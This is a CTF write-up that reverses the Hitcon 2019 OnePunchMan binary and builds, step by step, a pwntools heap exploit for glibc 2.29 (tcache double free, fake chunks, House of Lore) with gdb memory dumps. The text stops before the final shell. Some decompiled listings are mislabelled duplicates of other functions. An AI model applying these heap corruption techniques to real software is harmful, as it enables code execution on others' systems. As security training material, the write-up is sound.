---
layout: "post"
title: "Hitcon 2019 OnePunchMan Writeup"
date: 2020-5-28
exerpt: "House of Lore ,Tricky Tcache corruption on glibc 2.29 and ROP on Heap"
tags: [Heap, Glibc]
---

This challenge is something we really missed out during the actual CTF , but happens that now Im about to give an intended solution for this challenge after quite sometime.

**PS** This writeup is purely for my own learning and I'd be really happy if this is useful to you too :P.

I will not be discussing about the bug in this post as I have already discussed that in my [previous post](https://pwnverse.github.io/HouseOfLore/).
{: .notice}

Anyways , let's dive into some tcache exploitation now.

## TL;DR

We've been given the binary file and glibc 2.29 to start with.

Running `file` command , we see that it's `x86 64 bit` standard CTF-style binary.

Let's see what `checksec` has to tell us.

```sh
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

## Reversing

Firing up the binary in **IDA** , we see that the binary has menu-styled layout with the following functions.

* **DEBUT** - This function does the following 
    1. Reads the `unsigned long` idx and checks if it is less than 2.
    2. Reads **Hero Name** and checks if the length of name is in the range of **[0x7f,0x400]**.
    3. Has bss tables for storing Heap addresses of calloc'd chunks and the size.
    4. Finally , it copies our input onto the heap address with the use of `strncpy`.

```c
  print("idx: ");
  idx = read_int();
  if ( idx > 2 )
    error("invalid");
  print("hero name: ");
  memset(s, 0, 0x400uLL);
  size = read(0, s, 0x400uLL);
  if ( size <= 0 )
    error("io");
  s[size - 1] = 0;
  if ( size <= 0x7F || size > 0x400 )
    error("poor hero name");
  *(&heroes + 2 * idx) = calloc(1uLL, size);
  sizes[2 * idx] = size;
  strncpy(*(&heroes + 2 * idx), s, size);
  memset(s, 0, 0x400uLL);
```

* **RENAME** - This function is like any other standard safe edit functions which checks for `idx` and then reads into the location which the idx points to using the sizes table for calculating size.

```c
  print("idx: ");
  idx = read_int();
  if ( idx > 2 )
    error("invalid");
  print("hero name: ");
  memset(s, 0, 0x400uLL);
  size = read(0, s, 0x400uLL);
  if ( size <= 0 )
    error("io");
  s[size - 1] = 0;
  if ( size <= 0x7F || size > 0x400 )
    error("poor hero name");
  *(&heroes + 2 * idx) = calloc(1uLL, size);
  sizes[2 * idx] = size;
  strncpy(*(&heroes + 2 * idx), s, size);
  memset(s, 0, 0x400uLL);
```

* **SHOW** - This function prints the contents of the chunks by reading idx. 

```c
  unsigned int idx; // [rsp+Ch] [rbp-4h]

  print("idx: ");
  idx = read_int();
  if ( idx > 2 )
    error("invalid");
  result = *(&heroes + 2 * idx);
  if ( result )
  {
    print("hero name: ");
    result = puts(*(&heroes + 2 * idx));
  }
  return result;
```

* **RETIRE** - This function frees the chunk but does not NULL out the pointer in bss, hence we have **Use After Free** bug which could leverage us memory leaks.

```c

  unsigned int idx; // [rsp+Ch] [rbp-4h]

  print("idx: ");
  idx = read_int();
  if ( idx > 2 )
    error("invalid");
  result = *(&heroes + 2 * idx);
  if ( result )
  {
    print("hero name: ");
    result = puts(*(&heroes + 2 * idx));
  }
  return result;
```

* **SECRET** - This is the function where a **malloc** call of 0x217 happens. To trigger this function , we need to fill the 0x217 tcache with atleast 6 chunks and hence we can *malloc only if the tcache bins of size 0x217 are 6 or more*.

```c
  if ( *(qword_4030 + 32) <= 6 )
    error("gg");
  buf = malloc(0x217uLL);
  if ( !buf )
    error("err");
  if ( read(0, buf, 0x217uLL) <= 0 )
    error("io");
  puts("Serious Punch!!!");
  puts(&unk_2128);
  return puts(buf);
```

Fair Enough , now that we have a grasp of what the binary does , let's try exploiting it and spawn a shell :).


## Exploit Development

We begin with defining functions for doing necessary stuff for us.

```py
from pwn import *
import sys

io=process("./one_punch_loaded",env = {"LD_PRELOAD" : "./libc.so.6"})

if(len(sys.argv) == 1):
    context.noptrace = True

def add(idx,name):
    io.sendlineafter("> ",'1')
    io.sendlineafter("idx: ",str(idx))
    io.sendlineafter("name: ",str(name))

def edit(idx,name):
    io.sendlineafter("> ",'2')
    io.sendlineafter("idx: ",str(idx))
    io.sendafter("name: ",name)

def view(idx):
    io.sendlineafter("> ",'3')
    io.sendlineafter("idx: ",str(idx))

def free(idx):
    io.sendlineafter("> ",'4')
    io.sendlineafter("idx: ",str(idx))

def secret(data):
    io.sendlineafter("> ",'50056')
    io.send(data)


io.interactive()
```

### Memory Leaks

#### NOTICE
Calloc calls do not take from tcache.
{: .notice}

Heap Leak is just one step away , we simply add 2 chunks , free both and view the second chunk added.

For Libc Leak , we can simply fill a smallbin size tcache ,then add another chunk and free it , thus creating one unsorted bin chunk which has it's fd and bk pointers in libc bss `main_arena` struct.


```py

add(0,'0'*0x217)
add(1,'1'*0x217)

free(0)
free(1)

#Heap
view(1)
io.recvuntil('name: ')
heap_base = u64(io.recv(6) + '\x00'*2) - 0x260

#Fill 0x217 tcache
for _ in xrange(5):
    add(0,'2'*0x217)
    free(0)

add(0,'2'*0x217)
add(1,'3'*0x217) #Padding
#This time in unsorted bin
free(0)

#Libc
view(0)

io.recvuntil("hero name: ")
libc_base = u64(io.recv(6) + '\x00'*2) - 0x219ca0

log.info("Heap -> " + hex(heap_base))
log.info("Libc -> " + hex(libc_base))

```

We have the necessary leaks now , let's dive into some core exploitation :P.

Since we can `edit` free chunks also , we can easily `double_free` without crashing.

As we completely filled the 0x220 tcache , let us call `malloc` and consume one tcache , add another chunk of size 0x217 , free it and this chunk would silently fill back tcache without top consolidation.

The subsequent calloc call gives us the chunk that we had previously sent to unsorted bin.

Let us have a look at memory dump at each step from now on , for better understanding.

```
secret('a')
add(0,'T'*0x217)
free(0)
```
After freeing that chunk , we yet again fill the tcache of 0x217.

Now we erase `fd` and `bk` of this freed chunk and simply free it again without crashing.

This time , the same chunk goes into unsorted bin as it doesnt have any other choice  :thinking:.

```py
edit(0,p64(0)*2)
free(0)  
```

Now that we performed double free , let's observe the memory once.

```sh

0x55555555a130:	0x0032323232323232	0x0000000000000221 -> This chunk is both in tcache and main_arena unsorted bin
0x55555555a140:	0x00007ffff7fefca0	0x00007ffff7fefca0
0x55555555a150:	0x5454545454545454	0x5454545454545454


0x555555559150:	0x000055555555a140   -> This is tcache arena , let us call this victim chunk where we want to get allocation
0x7ffff7fefcb0 --> 0x55555555a130    -> This is main arena
```

Interestingly , we have the same [almost] chunk available in unsorted bin as well as tcache , the only difference being the way tcache and main_arena manage chunks , but then , we can fake that unsorted bin chunk and make it appear like the tcache chunk.

For that , let's extend the top chunk by adding 3 chunks of size 0x217 and freeing them all , thus sending a huge chunk into unsorted bin and merging with top.

```py

for i in xrange(3):
    add(i,'E'*0x217)

for i in xrange(3):
    free(i)

```

Let's examine the heap.

```sh

0x55555555a570:	0x0033333333333333	0x000000000001fa91 -> Notice how all chunks merged with top
0x55555555a580:	0x000055555555a130	0x00007ffff7fefca0
```

Now its time to create chunk of size 0x400 and have a fake chunk of size 0x220 inside it.

```py
fake_chunk = p64(0) + p64(0x221)          #Faking a chunk of size 0x221 [which is the chunk allocated at a request of 0x217 also]
fake_chunk += p64(heap_base+0x150-0x18)   #Using the victim chunk to bypass fd and bk checks
fake_chunk += p64(heap_base+0x150-0x10)
fake_chunk += fake_chunk.ljust(0x210,'F') #Filling up the fake chunk
fake_chunk += p64(0x220) + p64(0x600)     #Why 0x600? Let's see!

add(0,'a'*0x400)
edit(0,fake_chunk)

```
Let's see how this setup looks in the memory.

```sh
gdb-peda$ 
0x55555555a570:	0x0033333333333333	0x0000000000000411 -> This is the chunk of size 0x400 that we added
0x55555555a580:	0x0000000000000000	0x0000000000000211 -> This is the fake free chunk we created 
0x55555555a590:	0x0000555555559138	0x0000555555559140 -> fd and bk have been set to point to victim
0x55555555a5a0:	0x4646464646464646	0x4646464646464646
0x55555555a5b0:	0x4646464646464646	0x4646464646464646
0x55555555a5c0:	0x4646464646464646	0x4646464646464646
0x55555555a5d0:	0x4646464646464646	0x4646464646464646
0x55555555a5e0:	0x4646464646464646	0x4646464646464646
0x55555555a5f0:	0x4646464646464646	0x4646464646464646
0x55555555a600:	0x4646464646464646	0x4646464646464646
0x55555555a610:	0x4646464646464646	0x4646464646464646
0x55555555a620:	0x4646464646464646	0x4646464646464646
0x55555555a630:	0x4646464646464646	0x4646464646464646
0x55555555a640:	0x4646464646464646	0x4646464646464646
0x55555555a650:	0x4646464646464646	0x4646464646464646
0x55555555a660:	0x4646464646464646	0x4646464646464646
0x55555555a670:	0x4646464646464646	0x4646464646464646
0x55555555a680:	0x4646464646464646	0x4646464646464646
0x55555555a690:	0x4646464646464646	0x4646464646464646
0x55555555a6a0:	0x4646464646464646	0x4646464646464646
0x55555555a6b0:	0x4646464646464646	0x4646464646464646
0x55555555a6c0:	0x4646464646464646	0x4646464646464646
0x55555555a6d0:	0x4646464646464646	0x4646464646464646
0x55555555a6e0:	0x4646464646464646	0x4646464646464646
0x55555555a6f0:	0x4646464646464646	0x4646464646464646
0x55555555a700:	0x4646464646464646	0x4646464646464646
0x55555555a710:	0x4646464646464646	0x4646464646464646
0x55555555a720:	0x4646464646464646	0x4646464646464646
0x55555555a730:	0x4646464646464646	0x4646464646464646
0x55555555a740:	0x4646464646464646	0x4646464646464646
0x55555555a750:	0x4646464646464646	0x4646464646464646
0x55555555a760:	0x4646464646464646	0x4646464646464646
0x55555555a770:	0x4646464646464646	0x4646464646464646
0x55555555a780:	0x4646464646464646	0x4646464646464646
gdb-peda$ 
0x55555555a790:	0x0000000000000210	0x0000000000000600  -> Another chunk of 0x600 set up to trick malloc into thinking that previous chunk is free
0x55555555a7a0:	0x6161616161616161	0x6161616161616161
0x55555555a7b0:	0x6161616161616161	0x6161616161616161
0x55555555a7c0:	0x6161616161616161	0x6161616161616161
0x55555555a7d0:	0x6161616161616161	0x6161616161616161
0x55555555a7e0:	0x6161616161616161	0x6161616161616161
0x55555555a7f0:	0x6161616161616161	0x6161616161616161
0x55555555a800:	0x6161616161616161	0x6161616161616161
0x55555555a810:	0x6161616161616161	0x6161616161616161
0x55555555a820:	0x6161616161616161	0x6161616161616161
0x55555555a830:	0x6161616161616161	0x6161616161616161
0x55555555a840:	0x6161616161616161	0x6161616161616161
0x55555555a850:	0x6161616161616161	0x6161616161616161
0x55555555a860:	0x6161616161616161	0x6161616161616161
0x55555555a870:	0x6161616161616161	0x6161616161616161
0x55555555a880:	0x6161616161616161	0x6161616161616161
0x55555555a890:	0x6161616161616161	0x6161616161616161
0x55555555a8a0:	0x6161616161616161	0x6161616161616161
0x55555555a8b0:	0x6161616161616161	0x6161616161616161
0x55555555a8c0:	0x6161616161616161	0x6161616161616161
0x55555555a8d0:	0x6161616161616161	0x6161616161616161
0x55555555a8e0:	0x6161616161616161	0x6161616161616161
0x55555555a8f0:	0x6161616161616161	0x6161616161616161
gdb-peda$ 
0x55555555a900:	0x6161616161616161	0x6161616161616161
0x55555555a910:	0x6161616161616161	0x6161616161616161
0x55555555a920:	0x6161616161616161	0x6161616161616161
0x55555555a930:	0x6161616161616161	0x6161616161616161
0x55555555a940:	0x6161616161616161	0x6161616161616161
0x55555555a950:	0x6161616161616161	0x6161616161616161
0x55555555a960:	0x6161616161616161	0x6161616161616161
0x55555555a970:	0x6161616161616161	0x0061616161616161
gdb-peda$ 
0x55555555a980:	0x0000000000000000	0x000000000001f681   -> This is the top chunk

```

It is also very interesting to see the bss table where our chunks are stored based on their indices.

Now adding another chunk of size 0x400 and free the chunk which had the fake chunk , thus corrupting the size of fake chunk we created with a large heap address.

```
add(2,cyclic(0x400)) #Also preventing top consolidation
free(1)
```
This is how the heap looks with our fake chunk's size overwritten with tcache heap address.

```
gdb-peda$ 
0x55555555a570:	0x0033333333333333	0x0000000000000411
0x55555555a580:	0x0000000000000000	0x0000555555559010 -> The size of our chunk corrupted with bk of the new freed chunk
0x55555555a590:	0x0000555555559138	0x0000555555559140
0x55555555a5a0:	0x4646464646464646	0x4646464646464646
0x55555555a5b0:	0x4646464646464646	0x4646464646464646
0x55555555a5c0:	0x4646464646464646	0x4646464646464646
0x55555555a5d0:	0x4646464646464646	0x4646464646464646
0x55555555a5e0:	0x4646464646464646	0x4646464646464646
0x55555555a5f0:	0x4646464646464646	0x4646464646464646
0x55555555a600:	0x4646464646464646	0x4646464646464646
0x55555555a610:	0x4646464646464646	0x4646464646464646
0x55555555a620:	0x4646464646464646	0x4646464646464646
0x55555555a630:	0x4646464646464646	0x4646464646464646
0x55555555a640:	0x4646464646464646	0x4646464646464646
0x55555555a650:	0x4646464646464646	0x4646464646464646
0x55555555a660:	0x4646464646464646	0x4646464646464646
0x55555555a670:	0x4646464646464646	0x4646464646464646
0x55555555a680:	0x4646464646464646	0x4646464646464646
0x55555555a690:	0x4646464646464646	0x4646464646464646
0x55555555a6a0:	0x4646464646464646	0x4646464646464646
0x55555555a6b0:	0x4646464646464646	0x4646464646464646
0x55555555a6c0:	0x4646464646464646	0x4646464646464646
0x55555555a6d0:	0x4646464646464646	0x4646464646464646
0x55555555a6e0:	0x4646464646464646	0x4646464646464646
0x55555555a6f0:	0x4646464646464646	0x4646464646464646
0x55555555a700:	0x4646464646464646	0x4646464646464646
0x55555555a710:	0x4646464646464646	0x4646464646464646
0x55555555a720:	0x4646464646464646	0x4646464646464646
0x55555555a730:	0x4646464646464646	0x4646464646464646
0x55555555a740:	0x4646464646464646	0x4646464646464646
0x55555555a750:	0x4646464646464646	0x4646464646464646
0x55555555a760:	0x4646464646464646	0x4646464646464646
0x55555555a770:	0x4646464646464646	0x4646464646464646
0x55555555a780:	0x4646464646464646	0x4646464646464646
gdb-peda$ 
0x55555555a790:	0x0000000000000210	0x0000000000000600
```

The reason we set the next size to `0x600` was that , after adding another chunk of size 0x400 , the next of our fake chunk now points to top chunk.

```sh
gdb-peda$ x/4gx 0x55555555a790+0x600
0x55555555ad90:	0x0000000000000000	0x000000000001f271 -> Top Chunk
0x55555555ada0:	0x0000000000000000	0x0000000000000000
```

All this is set to trigger the vulnerability to leverage **House Of Lore**.

```c
/*
       If a small request, check regular bin.  Since these "smallbins"
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */

    if (in_smallbin_range(nb)) {
        // Get the index of the small bin
        idx = smallbin_index(nb);
        // Get the corresponding chunk pointer in the small bin
        bin = bin_at (av, idx);
        // First execute victim= last(bin) to get the last chunk of the small bin
        // If victim = bin , then the bin is empty.
        // If they are not equal, then there will be two cases
        if ((victim = last(bin)) != bin) {
            // In the first case, the small bin has not yet been initialized.
            if (victim == 0) /* initialization check */
                // Perform initialization to merge chunks in fast bins
                malloc_consolidate (of);
            // In the second case, there is a free chunk in the small bin
            else {
                // Get the second-to-last chunk in the small bin.
                bck = victim->bk;
                // Check if bck->fd is victim, prevent forgery
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // Set the corresponding inuse bit of victim
                set_inuse_bit_at_offset(victim, nb);
                // Modify the small bin list, take the last chunk of the small bin
                bin-> bk = bck;
                bck->fd = bin;
                // If it is not main_arena, set the corresponding flag
                if (av != &main_arena) set_non_main_arena(victim);
                // Detailed inspection
                check_malloced_chunk (off, victim, nb);
                // Convert the requested chunk to the corresponding mem state
                void *p = chunk2mem(victim);
                // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff
                alloc_perturb(p, bytes);
                return p;
            }
        }
    }

```

Calling malloc and now allocating the chunk which is in tcache as well as unsorted bin , hence we get a tcache chunk which is in libc `main_arena` struct due to unsafe unlink.

```py
secret(p64(heap_base + 0x1130))   
```



Let's take a look at memory layout after this.

```sh
gdb-peda$
0x555555559000:	0x0000000000000000	0x0000000000000251
0x555555559010:	0x0000000000000000	0x0000000000000000
0x555555559020:	0x0000000000000000	0x0000000000000000
0x555555559030:	0x0000000000000006	0x0000000000000000
0x555555559040:	0x0000000000000000	0x0100000000000000
0x555555559050:	0x0000000000000000	0x0000000000000000
0x555555559060:	0x0000000000000000	0x0000000000000000
0x555555559070:	0x0000000000000000	0x0000000000000000
0x555555559080:	0x0000000000000000	0x0000000000000000
0x555555559090:	0x0000000000000000	0x0000000000000000
0x5555555590a0:	0x0000000000000000	0x0000000000000000
0x5555555590b0:	0x0000000000000000	0x0000000000000000
0x5555555590c0:	0x0000000000000000	0x0000000000000000
0x5555555590d0:	0x0000000000000000	0x0000000000000000
0x5555555590e0:	0x0000000000000000	0x0000000000000000
0x5555555590f0:	0x0000000000000000	0x0000000000000000
0x555555559100:	0x0000000000000000	0x0000000000000000
0x555555559110:	0x0000000000000000	0x0000000000000000
0x555555559120:	0x0000000000000000	0x0000000000000000
0x555555559130:	0x0000000000000000	0x0000000000000000
0x555555559140:	0x0000000000000000	0x0000000000000000
0x555555559150:	0x00007ffff7fefeb0	0x0000000000000000 -> Victim chunk from main_arena
```

Now we consolidate 6 chunks of 0x200 size into top.

```py

for i in xrange(6):
    add(0,'4'*0x1f0)
    free(0)

```

